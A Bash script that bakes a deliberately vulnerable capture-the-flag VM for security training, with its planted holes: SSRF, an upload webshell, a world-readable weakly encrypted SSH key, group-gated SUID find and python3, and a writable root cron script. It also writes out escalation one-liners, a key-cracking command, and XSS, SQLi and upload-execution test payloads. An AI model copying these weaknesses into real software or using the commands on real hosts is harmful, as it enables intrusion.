#!/bin/bash
# ============================================================================
# bake-cybersaguaros-template.sh
# ----------------------------------------------------------------------------
# Bakes QEMU VM template 1703: the "CyberSaguaros Research Portal" — a custom
# vulnerable web app on Debian 13 LNMP (nginx + PHP-FPM + MariaDB). Deployed
# as an attachable module via POST /api/admin/lanes/:id/modules.
#
# Attack chain delivered by this template:
#   SSRF (SaguaroBot dataset verifier) -> internal admin-session provisioning
#   -> admin panel -> file-upload webshell (weak extension filter) -> RCE as
#   `saguarobot` (NO sudo) -> read the world-readable, passphrase-protected
#   deploy key in /opt/saguaro/deploy -> crack it (ssh2john + rockyou) -> SSH
#   as `hrivera` -> user flag -> root via a group-gated SUID find / SUID
#   python3 copy, or a fieldops-writable root cronjob -> root flag.
# Off the critical path: reflected XSS + SQLi on /research.php?q=.
#
# App source lives in the CyberCore repo at challenges/cybersaguaros-ssrf/. The
# VM git-clones it from GitHub on first boot (bake time) and the result is
# sealed into the template — lane clones never need repo access. Override the
# repo with CHALLENGE_REPO_URL / CHALLENGE_REPO_REF / CHALLENGE_DIR; set
# CHALLENGE_REPO_TOKEN if the repo is private.
#
# Companion to:
#   - bake-dvwa-template.sh        (sibling attached-module template, 1702)
#   - bake-juice-shop-template.sh  (sibling attached-module template, 1701)
#
# Run on a Proxmox node with internet access. Idempotent: refuses if 1703
# already exists. To re-bake: qm destroy 1703 --purge
# ============================================================================
set -euo pipefail

VMID=${VMID:-1703}
NAME=${NAME:-cybersaguaros-template}
STORAGE=${STORAGE:-vmpool}
SNIPPET_STORAGE="${SNIPPET_STORAGE:-}"
BAKE_BRIDGE="${BAKE_BRIDGE:-vmbr0}"
BAKE_VLAN="${BAKE_VLAN:-20}"
BAKE_DNS="${BAKE_DNS:-100.100.0.1}"
MEMORY=${MEMORY:-2048}
CORES=${CORES:-2}
DISK_GB=${DISK_GB:-12}

CLOUD_IMG_URL="${CLOUD_IMG_URL:-https://cloud.debian.org/images/cloud/trixie/latest/debian-13-generic-amd64.qcow2}"
CLOUD_IMG_LOCAL="/var/lib/vz/template/iso/debian-13-generic-amd64.qcow2"

# App source — git-cloned into the VM at bake time. CHALLENGE_REPO_TOKEN is
# only needed if the repo is private; if set it is spliced into the clone URL.
CHALLENGE_REPO_URL="${CHALLENGE_REPO_URL:-https://github.com/Saguaros-CyberHub/CyberCore.git}"
CHALLENGE_REPO_REF="${CHALLENGE_REPO_REF:-main}"
CHALLENGE_REPO_TOKEN="${CHALLENGE_REPO_TOKEN:-}"

# Repo-relative path to the challenge sources. Renamed in b429b6f
# (challenges/cybersaguaros -> challenges/cybersaguaros-ssrf) while three
# runcmd `cp` lines kept the old path. runcmd has no `set -e`, so all three
# failed silently and the bake only died later at SITE_HTTP with a misleading
# message. Keep the path in ONE place; the APP_SRC marker fails loudly if it
# is ever wrong again.
CHALLENGE_DIR="${CHALLENGE_DIR:-challenges/cybersaguaros-ssrf}"

# Linux accounts on the box.
#   saguarobot — PHP-FPM pool user; the webshell / reverse-shell foothold.
#                NO sudo, NOT in $PRIV_GROUP. It cannot reach root directly —
#                that is the entire point of the group gating below. `sudo -l`
#                is a deliberate dead end.
#   hrivera    — field-station sysadmin. The SSH / user-flag account. Reached
#                ONLY by finding the world-readable deploy private key under
#                $DEPLOY_DIR and cracking its passphrase. Deliberately absent
#                from the portal `users` table so the SQLi cannot leak it, and
#                its Linux password is strong and NOT in rockyou so there is no
#                password-spray shortcut.
#   dvalmont   — red herring. Real SSH login, rockyou password, nothing behind
#                it: no sudo, no group membership, no flag.
#   root       — bake-debug password for instructor inspection.
SAGUAROBOT_PASSWORD="${SAGUAROBOT_PASSWORD:-bake-debug-bot}"
# dvalmont's password is a rockyou word — it is also the SHA-256 hash in the
# portal `users` table (crackable via the SQLi dump). Keep this in sync with
# the dvalmont hash in ${CHALLENGE_DIR}/app/db/seed.sql.
DVALMONT_PASSWORD="sunshine"
ROOT_PASSWORD="${ROOT_PASSWORD:-bake-debug}"

SSH_USER="${SSH_USER:-hrivera}"
# Deliberately NOT crackable. The deploy key is the only intended way in; this
# exists so instructors can console-login or `su - $SSH_USER` during a demo.
SSH_PASSWORD="${SSH_PASSWORD:-Sag-F1eld-Ops-2026!}"

# Passphrase on the planted deploy key — the challenge's one cracking step:
#   ssh2john id_rsa > k.hash && john --wordlist=rockyou.txt k.hash
# MUST be a rockyou.txt word. rockyou is frequency-ordered, so keep it in the
# first ~10k lines or the crack drags on a CPU-only lane Kali.
# VERIFY BEFORE BAKING:  grep -n -x -m1 mariposa /usr/share/wordlists/rockyou.txt
DEPLOY_KEY_PASSPHRASE="${DEPLOY_KEY_PASSPHRASE:-mariposa}"
DEPLOY_DIR="${DEPLOY_DIR:-/opt/saguaro/deploy}"

# $SSH_USER ONLY. Owns the setuid maintenance toolkit and the root cron script.
# saguarobot must NEVER join it, or RCE short-circuits straight past the SSH
# stage to root.
PRIV_GROUP="${PRIV_GROUP:-fieldops}"

# The field-ops setuid maintenance toolkit. Deliberately NOT on the default
# PATH, so the copies never shadow /usr/bin/find or /usr/bin/python3 for any
# user; discovery is the canonical `find / -perm -4000 -type f 2>/dev/null`.
SUID_DIR="${SUID_DIR:-/opt/saguaro/bin}"

# Proof-of-ownership text files. Nothing in CyberCore validates these today
# (crucible_score has no submission route), so they are read-and-show only.
# NOTE: do NOT write these as ${VAR:-FLAG{...}} — the braces confuse bash.
USER_FLAG_VALUE="${USER_FLAG_VALUE:-}"
ROOT_FLAG_VALUE="${ROOT_FLAG_VALUE:-}"
[ -n "$USER_FLAG_VALUE" ] || USER_FLAG_VALUE='FLAG{cybersaguaros-user-7f2c9ab41de60358}'
[ -n "$ROOT_FLAG_VALUE" ] || ROOT_FLAG_VALUE='FLAG{cybersaguaros-root-c04e18d7b9a2f563}'

# Must match DB_PASS in ${CHALLENGE_DIR}/app/includes/config.php.
DB_APP_PASSWORD="Pr1ckly-Pear-Access-2026"

# ---------- 0. Sanity ----------
if qm status $VMID >/dev/null 2>&1; then
  echo "ERROR: VM $VMID already exists. Destroy first: qm destroy $VMID --purge" >&2
  exit 1
fi
if pct status $VMID >/dev/null 2>&1; then
  echo "ERROR: LXC $VMID exists at the same VMID." >&2
  exit 1
fi

# Effective clone URL — splice in the token for a private repo.
if [ -n "$CHALLENGE_REPO_TOKEN" ]; then
  CLONE_URL="https://${CHALLENGE_REPO_TOKEN}@${CHALLENGE_REPO_URL#https://}"
else
  CLONE_URL="$CHALLENGE_REPO_URL"
fi

pick_snippet_storage() {
  if [ -n "${SNIPPET_STORAGE:-}" ]; then
    if pvesm status -content snippets 2>/dev/null | awk 'NR>1 {print $1}' | grep -qx "$SNIPPET_STORAGE"; then
      echo "$SNIPPET_STORAGE"; return 0
    fi
    echo "ERROR: SNIPPET_STORAGE='$SNIPPET_STORAGE' set but missing 'snippets' content." >&2
    return 1
  fi
  local first
  first=$(pvesm status -content snippets 2>/dev/null | awk 'NR>1 {print $1}' | head -1)
  if [ -n "$first" ]; then echo "$first"; return 0; fi
  local cur
  cur=$(awk '/^[a-z]+: local$/{flag=1} flag && /^\s*content/{print $2; flag=0}' /etc/pve/storage.cfg)
  [ -z "$cur" ] && cur="iso,vztmpl,backup"
  [[ "$cur" != *snippets* ]] && pvesm set local --content "${cur},snippets" >&2
  echo "local"
}

SNIPPET_STORAGE=$(pick_snippet_storage)
echo "==> Snippet storage: $SNIPPET_STORAGE"
echo "==> App source:      git $CHALLENGE_REPO_URL ($CHALLENGE_REPO_REF)"
echo "==> Bake-time NIC:   bridge=$BAKE_BRIDGE${BAKE_VLAN:+ vlan=$BAKE_VLAN}"

# ---------- 1. Download cloud image (cached) ----------
if [ ! -f "$CLOUD_IMG_LOCAL" ]; then
  echo "==> Downloading Debian 13 cloud image (~350MB)..."
  mkdir -p "$(dirname "$CLOUD_IMG_LOCAL")"
  wget --progress=dot:giga -O "${CLOUD_IMG_LOCAL}.tmp" "$CLOUD_IMG_URL"
  mv "${CLOUD_IMG_LOCAL}.tmp" "$CLOUD_IMG_LOCAL"
fi
echo "==> Cloud image: $CLOUD_IMG_LOCAL"

# ---------- 2. Build cloud-init user-data ----------
USERDATA_FILE="cybersaguaros-template-bake-${VMID}.yml"
case "$SNIPPET_STORAGE" in
  local)  USERDATA_PATH="/var/lib/vz/snippets/${USERDATA_FILE}" ;;
  cephfs) USERDATA_PATH="/mnt/pve/cephfs/snippets/${USERDATA_FILE}" ;;
  *)      USERDATA_PATH="/var/lib/vz/snippets/${USERDATA_FILE}" ;;
esac
mkdir -p "$(dirname "$USERDATA_PATH")"

cat > "$USERDATA_PATH" << SNIPPET
#cloud-config
hostname: cybersaguaros
manage_etc_hosts: true

bootcmd:
  - [ sh, -c, 'rm -f /etc/resolv.conf; printf "nameserver $BAKE_DNS\n" > /etc/resolv.conf; exit 0' ]

users:
  - name: saguarobot
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $SAGUAROBOT_PASSWORD
  - name: dvalmont
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $DVALMONT_PASSWORD
  # The SSH / user-flag account. Group membership and everything under its home
  # directory happen in runcmd — $PRIV_GROUP does not exist yet at this point,
  # and write_files runs even earlier, before the account exists at all.
  - name: $SSH_USER
    gecos: H. Rivera, field station systems
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $SSH_PASSWORD

chpasswd:
  list: |
    root:$ROOT_PASSWORD
  expire: false
ssh_pwauth: true
disable_root: false

locale: en_US.UTF-8
timezone: America/Phoenix

package_update: true
package_upgrade: false
packages:
  - qemu-guest-agent
  - openssh-server
  # ssh-keygen / ssh — used to mint the planted deploy key and to run the
  # end-to-end AUTH marker below. A dependency of openssh-server anyway, but
  # the markers depend on it directly, so name it.
  - openssh-client
  - curl
  - wget
  - vim
  - net-tools
  - ca-certificates
  - resolvconf
  - cron
  - git
  - sudo
  - python3
  - nginx
  - mariadb-server
  - php-fpm
  - php-mysql
  - php-curl
  - php-gd
  - php-xml
  - php-mbstring

write_files:
  # ---- LinPE artifact: root cron running a $PRIV_GROUP-writable script ------
  # Same shape as bake-dvwa-template.sh's /opt/maintenance.sh, except the write
  # bit is gated to $PRIV_GROUP rather than world-writable, so saguarobot cannot
  # use it to skip the SSH stage. The chown happens in runcmd — the group does
  # not exist yet during write_files.
  #
  # cron requires: no dot in the /etc/cron.d filename, a trailing newline (the
  # YAML block scalar supplies one), and root ownership with no group/world
  # write bit on the crontab file itself.
  - path: /etc/cron.d/saguaro-fieldsync
    permissions: '0644'
    owner: root:root
    content: |
      # Field-station telemetry sync. Runs every minute as root.
      SHELL=/bin/sh
      PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
      * * * * * root /opt/saguaro/field-sync.sh >/dev/null 2>&1

  # World-readable (0775 -> other r-x), and this is how the deploy key is
  # discovered: the "ssh -i" line is the script legitimately doing its job, not
  # a planted hint. Doubles as the privesc target — root runs it every minute
  # and $PRIV_GROUP can edit it.
  #
  # \$SRC / \$DEST are RUNTIME shell variables and must stay escaped; $SSH_USER
  # is a bake-time substitution and must not be.
  - path: /opt/saguaro/field-sync.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/sh
      # Field-station telemetry sync. Pushes collected telemetry to the
      # off-site store. Field ops edit this file directly (hence the group
      # write bit) -- please keep it idempotent.
      #
      # TODO($SSH_USER): the deploy key under /opt/saguaro/deploy still has the
      # old 2024 passphrase and the wrong mode after the October restore.
      # Rotate it when the new field server is racked.
      SRC=/srv/telemetry
      DEST=fieldstore.cybersaguaros.local:/backups/telemetry
      [ -d "\$SRC" ] || exit 0
      rsync -az --delete \\
        -e "ssh -i /opt/saguaro/deploy/id_rsa -o StrictHostKeyChecking=no" \\
        "\$SRC/" "$SSH_USER@\$DEST/" 2>/dev/null || exit 0

  # ---- Challenge integrity: stop cloud-init re-granting saguarobot full sudo -
  # Lane clones boot on Proxmox's GENERATED cloud-init user-data (the bake only
  # strips cicustom, and attached-modules.js sets nothing but net0 on clone).
  # That generated user-data carries a "users: [default]" list, so cloud-init
  # applies system_info.default_user from /etc/cloud/cloud.cfg — which on Debian
  # is sudo: ["ALL=(ALL) NOPASSWD:ALL"] plus membership of the 'sudo' group.
  # Distro.create_user() early-returns from add_user() because saguarobot already
  # exists, but STILL calls write_sudo_rule(), emitting
  # /etc/sudoers.d/90-cloud-init-users. Net effect: the webshell foothold account
  # gets unrestricted root on every lane, collapsing the whole challenge.
  #
  # system_info is SYSTEM config — user-data cannot override it — so this
  # drop-in wins. 99- sorts last in /etc/cloud/cloud.cfg.d/.
  - path: /etc/cloud/cloud.cfg.d/99-cybercore-default-user.cfg
    permissions: '0644'
    owner: root:root
    content: |
      system_info:
        default_user:
          name: saguarobot
          lock_passwd: false
          sudo: false
          groups: []

  # Backstop for the drop-in. cloud-init's merge semantics for the 'groups'
  # LIST vary by version (append vs replace), so the drop-in alone is not
  # guaranteed to strip 'sudo' group membership. This runs after cloud-final on
  # every boot and removes both grants unconditionally. Deliberately narrow: it
  # touches ONLY cloud-init's own artefacts, nothing else in /etc/sudoers.d.
  - path: /usr/local/sbin/cybercore-sudo-guard.sh
    permissions: '0700'
    owner: root:root
    content: |
      #!/bin/sh
      # Challenge integrity guard — see 99-cybercore-default-user.cfg.
      # saguarobot must hold NO sudo at all: root is reachable only after
      # pivoting to $SSH_USER via the deploy key, then using the group-gated
      # setuid toolkit or the fieldops-writable root cronjob.
      rm -f /etc/sudoers.d/90-cloud-init-users
      gpasswd -d saguarobot sudo >/dev/null 2>&1 || true
      exit 0

  - path: /etc/systemd/system/cybercore-sudo-guard.service
    permissions: '0644'
    owner: root:root
    content: |
      [Unit]
      Description=Strip cloud-init's default-user sudo grant (CyberCore challenge integrity)
      After=cloud-final.service
      Wants=cloud-final.service

      [Service]
      Type=oneshot
      RemainAfterExit=yes
      ExecStart=/usr/local/sbin/cybercore-sudo-guard.sh

      [Install]
      WantedBy=multi-user.target

  # ---- Flavour artifact: planted research notes ----------------------------
  # Ambient only. Deliberately does NOT point at the deploy key — students find
  # that by reading field-sync.sh or enumerating /opt, not by being told.
  - path: /opt/saguaro/research-notes.txt
    permissions: '0644'
    content: |
      CyberSaguaros field station — research notes
      --------------------------------------------
      * portal DB app user: saguaro_app / $DB_APP_PASSWORD
      * H. Rivera runs the station box. Ping her before touching anything
        under /opt/saguaro — field ops owns that whole tree.
      * TODO: migrate the backup job to the internal domain. The lab DC is
        dc01.cybersaguaros.local; a Ligolo agent on 10.0.0.0/24 reaches it.

  - path: /etc/cybercore-bake.env
    permissions: '0644'
    content: |
      BAKE_NAME=$NAME
      BAKE_VMID=$VMID
      BAKE_KIND=cybersaguaros

runcmd:
  # ---- Restore bake-time DNS (resolvconf re-symlinks /etc/resolv.conf) ----
  - [ sh, -c, 'rm -f /etc/resolv.conf; printf "nameserver $BAKE_DNS\n" > /etc/resolv.conf' ]

  # ---- Fetch the app from the CyberCore repo (shallow clone) ----
  - [ sh, -c, 'git clone --depth 1 --branch $CHALLENGE_REPO_REF $CLONE_URL /opt/cybersaguaros-src' ]
  # Guard the rename that broke this bake once already (b429b6f). runcmd has no
  # "set -e", so a wrong path would otherwise fail silently three times over and
  # only surface as a confusing SITE_HTTP=no at the very end.
  - [ sh, -c, 'if [ -d /opt/cybersaguaros-src/$CHALLENGE_DIR/app ]; then echo "APP_SRC=yes" >> /etc/cybercore-bake.env; else echo "APP_SRC=no ($CHALLENGE_DIR)" >> /etc/cybercore-bake.env; fi' ]
  - [ sh, -c, 'mkdir -p /var/www/cybersaguaros && cp -r /opt/cybersaguaros-src/$CHALLENGE_DIR/app/. /var/www/cybersaguaros/' ]

  # ---- nginx site ----
  - [ sh, -c, 'cp /opt/cybersaguaros-src/$CHALLENGE_DIR/deploy/nginx-cybersaguaros.conf /etc/nginx/sites-available/cybersaguaros' ]
  - [ sh, -c, 'ln -sf /etc/nginx/sites-available/cybersaguaros /etc/nginx/sites-enabled/cybersaguaros' ]
  - [ sh, -c, 'rm -f /etc/nginx/sites-enabled/default' ]

  # ---- PHP-FPM pool (version-detected) running as saguarobot ----
  - [ sh, -c, 'PHPVER=\$(ls /etc/php/ | head -1); cp /opt/cybersaguaros-src/$CHALLENGE_DIR/deploy/php-fpm-pool.conf /etc/php/\$PHPVER/fpm/pool.d/cybersaguaros.conf' ]

  # ---- MariaDB: database, app user, schema + seed ----
  - [ systemctl, enable, mariadb ]
  - [ systemctl, start, mariadb ]
  - [ sh, -c, 'mysql -e "CREATE DATABASE IF NOT EXISTS cybersaguaros;"' ]
  - [ sh, -c, "mysql -e \"CREATE USER IF NOT EXISTS 'saguaro_app'@'localhost' IDENTIFIED BY '$DB_APP_PASSWORD';\"" ]
  - [ sh, -c, "mysql -e \"GRANT ALL PRIVILEGES ON cybersaguaros.* TO 'saguaro_app'@'localhost';\"" ]
  - [ sh, -c, 'mysql -e "FLUSH PRIVILEGES;"' ]
  - [ sh, -c, 'mysql cybersaguaros < /var/www/cybersaguaros/db/schema.sql' ]
  - [ sh, -c, 'mysql cybersaguaros < /var/www/cybersaguaros/db/seed.sql' ]
  # Drop the SQL files from the deployed app dir once the DB is seeded. They
  # are not needed at runtime, sit outside the nginx webroot anyway, and
  # seed.sql's password hashes otherwise surface as noise in post-exploitation
  # tooling (linpeas file/hash scans).
  - [ sh, -c, 'rm -rf /var/www/cybersaguaros/db' ]

  # ---- Permissions ----
  # App owned by root; only the uploads dir is writable by the PHP-FPM user
  # (so the upload works) — uploads dir doubles as the RCE landing zone.
  - [ sh, -c, 'chown -R root:root /var/www/cybersaguaros' ]
  - [ sh, -c, 'chown -R saguarobot:saguarobot /var/www/cybersaguaros/public/uploads' ]
  - [ sh, -c, 'chmod 755 /var/www/cybersaguaros/public/uploads' ]

  # ==========================================================================
  # Identity + LinPE artifacts. All deliberate.
  # \$ escapes = runtime guest shell; bare $VAR = bake-time substitution.
  # ==========================================================================

  # ---- Privilege group -----------------------------------------------------
  # $PRIV_GROUP holds $SSH_USER and nobody else. saguarobot must never join it.
  - [ sh, -c, '/usr/sbin/groupadd -f $PRIV_GROUP' ]
  - [ sh, -c, '/usr/sbin/usermod -aG $PRIV_GROUP $SSH_USER' ]

  # ---- Artifact 1: leaked passphrase-protected deploy key ------------------
  # THE lateral-movement path. -m PEM writes the legacy
  # "-----BEGIN RSA PRIVATE KEY-----" form (AES-128-CBC + MD5 KDF), chosen
  # because (a) it is a coherent story for a key predating the October restore
  # and (b) ssh2john/john crack it in seconds, whereas a modern OpenSSH-format
  # ed25519 key uses bcrypt-KDF at 16 rounds and can eat a whole class hour.
  # The private key is left mode 0644 — that is the planted misconfiguration.
  # ~/.ssh keeps NORMAL 0700/0600 perms and sshd StrictModes stays ON, because
  # nothing in this design needs it weakened.
  - [ sh, -c, 'mkdir -p $DEPLOY_DIR' ]
  - [ sh, -c, 'ssh-keygen -q -t rsa -b 2048 -m PEM -C "field-sync@cybersaguaros" -N "$DEPLOY_KEY_PASSPHRASE" -f $DEPLOY_DIR/id_rsa' ]
  - [ sh, -c, 'mkdir -p /home/$SSH_USER/.ssh; cat $DEPLOY_DIR/id_rsa.pub >> /home/$SSH_USER/.ssh/authorized_keys' ]
  - [ sh, -c, 'chown -R $SSH_USER:$SSH_USER /home/$SSH_USER/.ssh; chmod 700 /home/$SSH_USER/.ssh; chmod 600 /home/$SSH_USER/.ssh/authorized_keys' ]
  # *** VULNERABILITY: world-readable SSH private key ***
  - [ sh, -c, 'chown root:root $DEPLOY_DIR/id_rsa $DEPLOY_DIR/id_rsa.pub; chmod 755 $DEPLOY_DIR; chmod 644 $DEPLOY_DIR/id_rsa $DEPLOY_DIR/id_rsa.pub' ]
  # Ambient residue so the directory reads as lived-in rather than planted.
  - [ sh, -c, 'printf "%s\n" "2025-10-14 02:00:04 sync ok  (1.2 GiB, 41 files)" "2025-10-15 02:00:03 sync ok  (0.3 GiB, 12 files)" "2025-10-16 02:00:07 ssh: connect to host fieldstore.cybersaguaros.local port 22: No route to host" > $DEPLOY_DIR/field-sync.log; chmod 644 $DEPLOY_DIR/field-sync.log' ]

  # ---- Artifact 2: field-ops setuid maintenance toolkit --------------------
  # COPIES, never the real binaries: /usr/bin/find and /usr/bin/python3 stay
  # 0755, and $SUID_DIR is off the default PATH, so nothing is shadowed for
  # anyone. Only $PRIV_GROUP can execute these.
  # NEVER use "ln" here — a hard link shares the inode and the setuid bit would
  # land on /usr/bin/python3.13 itself. "cp" dereferences the symlink.
  # GTFObins escalation, as $SSH_USER:
  #   $SUID_DIR/find . -exec /bin/sh -p \; -quit
  #   $SUID_DIR/python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
  # The -p and the explicit setuid(0) are required — both shells drop euid.
  - [ sh, -c, 'mkdir -p $SUID_DIR' ]
  - [ sh, -c, 'cp /usr/bin/find $SUID_DIR/find; cp /usr/bin/python3 $SUID_DIR/python3' ]
  - [ sh, -c, 'chown root:$PRIV_GROUP $SUID_DIR/find $SUID_DIR/python3' ]
  - [ sh, -c, 'chmod 4750 $SUID_DIR/find $SUID_DIR/python3' ]
  - [ sh, -c, 'printf "%s\n" "Field ops maintenance helpers." "" "Setuid so the on-call team can run the nightly sweeps and the telemetry" "reindex without a sudo grant. Group-restricted to $PRIV_GROUP." "Do not add anything here without asking H. Rivera." > $SUID_DIR/README; chmod 644 $SUID_DIR/README' ]

  # ---- Artifact 3: root cron on a $PRIV_GROUP-writable script --------------
  # /opt/saguaro itself stays 0755 root:root, so field-sync.sh can be modified
  # in place but not replaced by rename.
  - [ sh, -c, 'chown root:root /opt/saguaro; chmod 755 /opt/saguaro' ]
  - [ sh, -c, 'chown root:$PRIV_GROUP /opt/saguaro/field-sync.sh; chmod 775 /opt/saguaro/field-sync.sh' ]

  # ---- Artifact 4: flags ---------------------------------------------------
  # /home/$SSH_USER is 0750 $SSH_USER:$SSH_USER, so saguarobot cannot read
  # user.txt — the SSH stage cannot be skipped.
  - [ sh, -c, 'chmod 750 /home/$SSH_USER' ]
  - [ sh, -c, 'printf "%s\n" "$USER_FLAG_VALUE" > /home/$SSH_USER/user.txt; chown $SSH_USER:$SSH_USER /home/$SSH_USER/user.txt; chmod 640 /home/$SSH_USER/user.txt' ]
  - [ sh, -c, 'printf "%s\n" "$ROOT_FLAG_VALUE" > /root/root.txt; chown root:root /root/root.txt; chmod 600 /root/root.txt' ]

  # ---- Enable + start services ----
  - [ systemctl, enable, qemu-guest-agent ]
  - [ systemctl, enable, ssh ]
  - [ systemctl, enable, cron ]
  - [ systemctl, enable, nginx ]
  # Challenge integrity: enable (do NOT start) the sudo guard, and clear any
  # grant cloud-init already emitted during this bake. "enable" alone is right —
  # the unit's job is to run on every LANE CLONE boot, not during the bake.
  - [ systemctl, daemon-reload ]
  - [ systemctl, enable, cybercore-sudo-guard.service ]
  - [ sh, -c, 'rm -f /etc/sudoers.d/90-cloud-init-users /etc/sudoers.d/saguarobot-python; gpasswd -d saguarobot sudo >/dev/null 2>&1 || true' ]
  - [ sh, -c, 'PHPVER=\$(ls /etc/php/ | head -1); systemctl enable php\${PHPVER}-fpm; systemctl restart php\${PHPVER}-fpm' ]
  - [ systemctl, restart, nginx ]

  # ---- Pre-seal sanity markers. \$ escapes = runtime shell, not bake heredoc ----
  - [ sh, -c, 'sleep 5; ss -ltn "( sport = :80 )" | grep -q LISTEN && echo "PORT_80_LISTEN=yes" >> /etc/cybercore-bake.env || echo "PORT_80_LISTEN=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/); [ "\$code" = "200" ] && echo "SITE_HTTP=yes" >> /etc/cybercore-bake.env || echo "SITE_HTTP=no (\$code)" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/api/verify.php); [ "\$code" = "400" ] && echo "SSRF_ENDPOINT=yes" >> /etc/cybercore-bake.env || echo "SSRF_ENDPOINT=no (\$code)" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'curl -s http://127.0.0.1/api/internal/provision.php | grep -q admin_session && echo "INTERNAL_OK=yes" >> /etc/cybercore-bake.env || echo "INTERNAL_OK=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.php.jpg; out=\$(curl -s http://127.0.0.1/uploads/baketest.php.jpg); rm -f /var/www/cybersaguaros/public/uploads/baketest.php.jpg; echo "\$out" | grep -q 92837465 && echo "UPLOAD_EXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_EXEC=no" >> /etc/cybercore-bake.env' ]
  # Reflected XSS: prove the payload comes back RAW. grep -F is essential — the
  # payload is not a regex. If research.php still escaped the term, the body
  # would carry &lt;script&gt; and this fails.
  - [ sh, -c, 'body=\$(curl -s -G --data-urlencode "q=<script>alert(92837465)</script>" http://127.0.0.1/research.php); printf "%s" "\$body" | grep -Fq "<script>alert(92837465)</script>" && echo "XSS_REFLECT=yes" >> /etc/cybercore-bake.env || echo "XSS_REFLECT=no" >> /etc/cybercore-bake.env' ]

  # SQLi must NOT have regressed while editing research.php: %27 breaks the
  # LIKE string and PDO's message renders in <pre class="dberr">.
  - [ sh, -c, 'curl -s "http://127.0.0.1/research.php?q=x%27" | grep -q "SQLSTATE" && echo "SQLI_ENDPOINT=yes" >> /etc/cybercore-bake.env || echo "SQLI_ENDPOINT=no" >> /etc/cybercore-bake.env' ]

  # Deploy key: present, actually ENCRYPTED, and readable by saguarobot.
  - [ sh, -c, 'if grep -q "ENCRYPTED" $DEPLOY_DIR/id_rsa 2>/dev/null && su -s /bin/sh saguarobot -c "cat $DEPLOY_DIR/id_rsa" >/dev/null 2>&1; then echo "DEPLOY_KEY=yes" >> /etc/cybercore-bake.env; else echo "DEPLOY_KEY=no" >> /etc/cybercore-bake.env; fi' ]

  # NEGATIVE: the key must NOT authenticate without the passphrase. If this ever
  # passes, the passphrase silently did not take and the cracking stage is
  # skippable. NOTE the chmod 600 on the COPY: the shipped key is deliberately
  # 0644, and ssh refuses a world-readable key outright ("UNPROTECTED PRIVATE
  # KEY FILE") — testing it in place would pass for the wrong reason and prove
  # nothing about the passphrase. BatchMode=yes means ssh cannot prompt, so an
  # encrypted key fails and an unencrypted one succeeds.
  - [ sh, -c, 'cp $DEPLOY_DIR/id_rsa /tmp/bake-nopass; chmod 600 /tmp/bake-nopass; if ssh -q -i /tmp/bake-nopass -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ConnectTimeout=10 $SSH_USER@127.0.0.1 id >/dev/null 2>&1; then echo "KEY_ENCRYPTED=no" >> /etc/cybercore-bake.env; else echo "KEY_ENCRYPTED=yes" >> /etc/cybercore-bake.env; fi; rm -f /tmp/bake-nopass' ]

  # END TO END: decrypt a COPY with the passphrase, then SSH in as $SSH_USER.
  # Proves the passphrase is right, the pubkey is installed, sshd accepts an
  # RSA-PEM key on this OpenSSH build, and StrictModes is satisfied. Copy + rm
  # so the shipped key is never modified.
  # IdentitiesOnly + PasswordAuthentication=no so a pass here can ONLY mean the
  # key authenticated — never a silent fallback to $SSH_USER's password.
  - [ sh, -c, 'cp $DEPLOY_DIR/id_rsa /tmp/bake-key; chmod 600 /tmp/bake-key; ssh-keygen -q -p -P "$DEPLOY_KEY_PASSPHRASE" -N "" -f /tmp/bake-key >/dev/null 2>&1; ssh -q -i /tmp/bake-key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ConnectTimeout=10 $SSH_USER@127.0.0.1 id > /tmp/bake-key.out 2>&1; grep -q "$SSH_USER" /tmp/bake-key.out && echo "SSH_KEY_E2E=yes" >> /etc/cybercore-bake.env || echo "SSH_KEY_E2E=no" >> /etc/cybercore-bake.env; rm -f /tmp/bake-key /tmp/bake-key.out' ]

  # SUID find: exact mode + owner + group.
  - [ sh, -c, 'm=\$(stat -c "%a %U %G" $SUID_DIR/find 2>/dev/null); [ "\$m" = "4750 root $PRIV_GROUP" ] && echo "SUID_FIND=yes" >> /etc/cybercore-bake.env || echo "SUID_FIND=no (\$m)" >> /etc/cybercore-bake.env' ]

  # SUID python3: an EXECUTION test, not a stat test. A copied CPython has to
  # re-derive sys.prefix from its new argv[0]; printing 0 proves both euid==0
  # and that the stdlib resolved from the new location.
  - [ sh, -c, 'printf "import os\nprint(os.geteuid())\n" > /tmp/bake-euid.py; out=\$(su -s /bin/sh $SSH_USER -c "$SUID_DIR/python3 /tmp/bake-euid.py" 2>&1 | tr "\n" " "); rm -f /tmp/bake-euid.py; [ "\$out" = "0 " ] && echo "SUID_PYTHON=yes" >> /etc/cybercore-bake.env || echo "SUID_PYTHON=no (\$out)" >> /etc/cybercore-bake.env' ]

  # NEGATIVE: the gate must hold against saguarobot, or the whole point of the
  # group-restricted toolkit is unverified.
  - [ sh, -c, 'if su -s /bin/sh saguarobot -c "$SUID_DIR/find /etc/hostname" >/dev/null 2>&1; then echo "SUID_GATED=no" >> /etc/cybercore-bake.env; else echo "SUID_GATED=yes" >> /etc/cybercore-bake.env; fi' ]

  # Guard against a future $SUID_DIR landing somewhere on PATH and shadowing
  # /usr/bin for saguarobot's own enumeration.
  - [ sh, -c, 'printf "python3 -c pass\nfind /etc/hostname\n" > /tmp/bake-bot.sh; if su -s /bin/sh saguarobot -c "sh /tmp/bake-bot.sh" >/dev/null 2>&1; then echo "BOT_TOOLS=yes" >> /etc/cybercore-bake.env; else echo "BOT_TOOLS=no" >> /etc/cybercore-bake.env; fi; rm -f /tmp/bake-bot.sh' ]

